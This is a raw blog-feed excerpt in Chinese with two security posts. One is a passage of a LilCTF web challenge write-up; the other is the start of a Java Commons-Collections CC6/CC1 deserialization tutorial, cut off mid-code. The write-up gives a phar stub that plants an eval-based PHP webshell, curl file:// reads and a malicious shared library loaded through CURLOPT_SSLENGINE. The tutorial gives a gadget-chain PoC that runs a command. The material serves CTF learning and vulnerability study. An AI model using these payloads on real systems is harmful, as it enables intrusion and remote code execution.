invoke__">__HALT_COMPILER</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>所以就直接rce了</p><p>但是这道题直接传上去没有任何回显，估计可能是函数禁用了，push gpt写代码看可用函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 离线分析 php.ini 中 disable_functions，并列出所有可用函数 + 语言结构</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$argc</span> &lt; <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;❌ 用法: php <span class="hljs-subst">&#123;$argv[0]&#125;</span> /path/to/php.ini\n&quot;</span>;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-variable">$iniPath</span> = <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$iniPath</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;❌ 找不到 php.ini 文件: <span class="hljs-subst">$iniPath</span>\n&quot;</span>;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">// --- 1. 获取 disable_functions ---</span><br><span class="hljs-variable">$iniContent</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$iniPath</span>);<br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\s*disable_functions\s*=\s*(.*)$/mi&#x27;</span>, <span class="hljs-variable">$iniContent</span>, <span class="hljs-variable">$matches</span>);<br><span class="hljs-variable">$disabledRaw</span> = <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$disabledFunctions</span> = <span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;trim&#x27;</span>, <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$disabledRaw</span>)));<br><span class="hljs-variable">$disabledFunctions</span> = <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;strtolower&#x27;</span>, <span class="hljs-variable">$disabledFunctions</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;🔒 禁用函数数量: &quot;</span> . <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$disabledFunctions</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-comment">// --- 2. 获取所有内置函数 ---</span><br><span class="hljs-variable">$allFunctions</span> = <span class="hljs-title function_ invoke__">get_defined_functions</span>()[<span class="hljs-string">&#x27;internal&#x27;</span>];<br><span class="hljs-variable">$allFunctions</span> = <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;strtolower&#x27;</span>, <span class="hljs-variable">$allFunctions</span>);<br><span class="hljs-title function_ invoke__">sort</span>(<span class="hljs-variable">$allFunctions</span>);<br><br><span class="hljs-comment">// --- 3. 剔除禁用函数 ---</span><br><span class="hljs-variable">$availableFunctions</span> = <span class="hljs-title function_ invoke__">array_diff</span>(<span class="hljs-variable">$allFunctions</span>, <span class="hljs-variable">$disabledFunctions</span>);<br><span class="hljs-title function_ invoke__">sort</span>(<span class="hljs-variable">$availableFunctions</span>);<br><br><span class="hljs-comment">// --- 4. 常见语言结构（永远可用） ---</span><br><span class="hljs-variable">$languageConstructs</span> = [<br>    <span class="hljs-string">&#x27;include&#x27;</span>, <span class="hljs-string">&#x27;include_once&#x27;</span>, <span class="hljs-string">&#x27;require&#x27;</span>, <span class="hljs-string">&#x27;require_once&#x27;</span>,<br>    <span class="hljs-string">&#x27;echo&#x27;</span>, <span class="hljs-string">&#x27;print&#x27;</span>, <span class="hljs-string">&#x27;isset&#x27;</span>, <span class="hljs-string">&#x27;empty&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;die&#x27;</span>,<br>    <span class="hljs-string">&#x27;array&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-comment">// 注：eval 是特例，会被 disable_functions 禁用</span><br>];<br><br><span class="hljs-variable">$languageConstructsAvailable</span> = [];<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$languageConstructs</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$construct</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$construct</span>, <span class="hljs-variable">$disabledFunctions</span>)) &#123;<br>        <span class="hljs-variable">$languageConstructsAvailable</span>[] = <span class="hljs-variable">$construct</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;✅ 可用函数数量: &quot;</span> . <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$availableFunctions</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;🧱 可用语言结构数量: &quot;</span> . <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$languageConstructsAvailable</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-comment">// --- 5. 保存所有结果 ---</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;available_functions.txt&quot;</span>, <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-variable">$availableFunctions</span>));<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;available_language_constructs.txt&quot;</span>, <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-variable">$languageConstructsAvailable</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;📄 函数保存: available_functions.txt\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;📄 语言结构保存: available_language_constructs.txt\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>结果如下</p><p><a href="assets/available_functions-20250821144706-3izjtyn.txt">available_functions.txt</a></p><p><a href="assets/available_language_constructs-20250821145436-o8j60b6.txt">available_language_constructs.txt</a></p><p>发现<code>file_put_contents</code>​没有被禁用</p><p>那么可以利用 <code>include</code>​ 加载这个 <code>.phar.gz</code>​ 文件，执行 <code>stub</code>​ 里的 <code>file_put_contents()</code>​ 写入木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;exploit.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><br><span class="hljs-variable">$stub</span> = <span class="hljs-string">&lt;&lt;&lt;&#x27;STUB&#x27;</span><br><span class="hljs-string">&lt;?php</span><br><span class="hljs-string">    file_put_contents(&#x27;/var/www/html/1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);</span><br><span class="hljs-string">    __HALT_COMPILER();</span><br><span class="hljs-string">?&gt;</span><br><span class="hljs-string">STUB</span>;<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-variable">$stub</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>转为.phar.gz并上传</p><p>​<code>challenge.xinshi.fun:31441/?down=exploit.phar.gz</code>​</p><p>题目中 <code>include($_GET[&#39;down&#39;])</code>​ 的逻辑会触发 stub 被执行，在服务器 <code>/var/www/html/1.php</code>​ 写入木马代码</p><p>利用木马读 <code>index.php</code>​ 源码</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250821153949-jl36kul.png" alt="image"></p><p>得出完整代码中的关键部分代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$target_dir</span> = <span class="hljs-string">&quot;/tmp/&quot;</span>;<br>    <span class="hljs-variable">$target_file</span> = <span class="hljs-variable">$target_dir</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>    <span class="hljs-variable">$orig</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-string">&#x27;file://&#x27;</span>. <span class="hljs-variable">$orig</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_PROTOCOLS_STR, <span class="hljs-string">&quot;all&quot;</span>); <span class="hljs-comment">// secret trick to bypass, omg why will i show it to you!</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;&lt;?&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;php&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;halt&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$target_file</span>, <span class="hljs-variable">$data</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;存在 `&lt;?` 或者 `php` 或者 `halt` 恶意字符!&quot;</span>;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现隐藏的代码是<code>curl_setopt($ch, CURLOPT_PROTOCOLS_STR, &quot;all&quot;);</code>​</p><p>于是可以搜索到</p><p><a href="https://github.com/php/php-src/issues/16802">https://github.com/php/php-src/issues/16802</a></p><p>​<code>curl_setopt($ch, CURLOPT_PROTOCOLS_STR, &quot;all&quot;)</code>​是 PHP 中用于配置 cURL 会话的代码，其核心作用是允许 cURL 使用所有支持的协议进行数据传输。那用法显而易见，可以配合<code>file://</code>​协议进行任意文件读取</p><p>它是 PHP cURL 中最核心的选项之一，用于控制 <code>curl_exec()</code>​函数的行为。其核心功能是将请求的响应内容作为字符串返回。</p><p>那么payload就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<span class="hljs-comment">//这里填要读取的文件</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_PROTOCOLS_STR, <span class="hljs-string">&quot;all&quot;</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>;<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure><p>但是根据题目，我们要先运行readflag，才可以拿到flag</p><p>于是根据<a href="https://hackerone.com/reports/3293801">https://hackerone.com/reports/3293801</a></p><p>省流：</p><p>在类 POSIX 系统（Linux、macOS 等）上，curl 命令行工具存在任意代码执行漏洞。engine选项允许从共享库（.so文件）中加载OpenSSL加密引擎。最重要的是，该选项接受库文件的绝对路径或相对路径，允许用户加载文件系统上的任何共享库。<br>攻击者可以制作一个包含 <strong>attribute</strong>((constructor)) 函数的恶意共享库。当库被加载到 curl 进程的内存中时，动态加载器就会执行该函数，从而立即执行代码，甚至在 OpenSSL 尝试将其初始化为引擎之前也是如此。<br>如果攻击者能够影响传递给 curl 命令的参数，这将导致直接 RCE，这在网络应用程序后端、CI&#x2F;CD 管道和其他自动化脚本中很常见。</p><p>也就是说只要我们把恶意<code>so</code>​文件传上去再通过<code>curl --engine</code>​调用即可<code>rce</code>​，但是这个题目并不能使用这个命令，但是有相对应的cURL函数，我们来找一下</p><p>​<code>CURLOPT_SSLENGINE</code>​的作用：此选项用于设置 OpenSSL 引擎的名称或动态库路径。</p><p>那么payload就清楚了，只需要对上面的payload稍作修改即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<span class="hljs-comment">//这里填要读取的文件</span><br>curl <span class="hljs-title function_ invoke__">_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_SSLENGINE,<span class="hljs-string">&quot;/tmp/evil_engine.so&quot;</span>)<span class="hljs-comment">//evil_engine.so即为恶意库</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>;<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure><p>现在我们来编写恶意库<code>so</code>​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><br><span class="hljs-title function_ invoke__">__attribute__</span>((constructor))<br><span class="hljs-built_in">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_ invoke__">rce_init</span>(<span class="hljs-keyword">void</span>) &#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;/readflag &gt; /var/www/html/flag.txt&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后<code>gcc -fPIC -shared -o evil_engine.so evil_engine.c</code>​编译这个文件即可</p><p>再将<code>evil_engine.so</code>​上传</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250821160811-dna60m1.png" alt="image"></p><p>将写好的payload上传到1.php</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250821163347-pdqxstx.png" alt="image"></p><p>说明执行成功，再访问flag.txt</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250821163321-b9agr1h.png" alt="image"></p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>LilCTF</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化CC6链</title>
    <link href="/post/cc6-chain-z1sis3e.html"/>
    <url>/post/cc6-chain-z1sis3e.html</url>
    
    <content type="html"><![CDATA[<h1 id="CC6链"><a href="#CC6链" class="headerlink" title="CC6链"></a>CC6链</h1><p>CC6被称为是最好用的CC利用链，因为他不限制jdk版本，只要commons collections 小于等于3.2.1，都存在这个漏洞。</p><p>实际上 CC6链子 又是CC1的一个变种，找到这个漏洞的人又开辟出 一个新的线路 通过 TiedMapEntry.hashcode() 去触发 CC1里的 LazyMap.get()</p><p>这里我们是继续沿用的CC1 的项目<br>jdk版本：jdk8u65<br>pom.xml内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>上次CC1链我们只分析了用TransformedMap，那么这里用LazyMap再往前找一个链子</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250813142513-4dhf48d.png" alt="image"></p><p>可以看到这里有个get方法</p><p>LazyMap的get方法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>LazyMap就是一开始不写这个键，到调用的时候再把key弄出来</p><p>如果map有key就直接返回，如果没有就用transform方法调用一次，所以我们要确保没有这个key</p><p>那么接下来就看哪个调用了get方法</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250813144003-khp455v.png" alt="image"></p><p>最后找到是在AnnotationInvocationHandler里面有一个可控的get方法</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250813145108-es0w8o1.png" alt="image"></p><p>于是我们包装成动态代理，让反序列化过程自动调用LazyMap.get()</p><p>那么我们分析一下这个invoke方法</p><p>如果调用的是 <code>equals(Object obj)</code>​，就调用自定义的 <code>equalsImpl()</code>​。</p><p>如果其他方法有参数（除了 <code>equals</code>​），就抛出错误。</p><p>如果调用的不是上述方法，就会尝试从 <code>memberValues</code>​ 这个 <code>Map&lt;String, Object&gt;</code>​ 中取出对应的值。</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250813151043-xv262pj.png" alt="image"></p><p>也就是说readObject要调用一个无参方法</p><p>看一下readObject</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250813151254-ow5utp6.png" alt="image"></p><p>正好发现了一个无参方法</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250813151624-52az1u0.png" alt="image"></p><p>重新写一下poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        chainedTransformer.transform(Runtime.class);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationHandlerConstruction</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>        annotationInvocationHandlerConstruction.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//Override.class → 随便找一个合法的注解类型（必须是注解类，否则构造函数会报错）</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationInvocationHandlerConstruction.newInstance(Override.class,lazyMap);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationHandlerConstruction.newInstance(Override.class, mapProxy);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title 